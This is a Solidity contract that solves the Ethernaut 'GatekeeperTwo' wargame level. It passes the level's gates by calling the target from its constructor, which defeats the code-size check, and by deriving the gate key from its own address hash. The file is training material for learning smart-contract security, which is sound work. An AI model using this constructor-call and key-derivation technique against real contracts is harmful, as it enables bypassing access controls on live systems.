// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/GatekeeperTwo.sol';
contract GatekeeperTwoSolution {
  GatekeeperTwo target;
  constructor(address targetAddress) {
    target = GatekeeperTwo(targetAddress);
    target.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max));
  }
}